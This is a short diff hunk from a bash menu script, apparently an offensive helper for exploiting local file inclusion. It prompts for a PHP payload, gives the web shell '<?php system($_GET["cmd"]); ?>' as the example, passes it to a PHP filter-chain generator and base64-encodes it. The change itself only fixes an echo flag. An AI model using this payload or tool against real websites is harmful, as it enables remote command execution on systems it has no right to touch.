@@ -171,7 +171,7 @@ case $number in
 echo "[+] Hey LFI right you need to create orgenerate the payload using php filters worry out"
 read -p "Enter the php payload ecample <?php system($_GET["cmd"]); ?>: " pay
 python3 phpcrash.py --chain "$pay"
-echo "\nProccessing encoded base64 payload..."
+echo -e "\nProccessing encoded base64 payload..."
 sleep 2
 base=$(echo -n "$pay" | base64)
 python3 phpcrash.py --rawbase64 "$base"
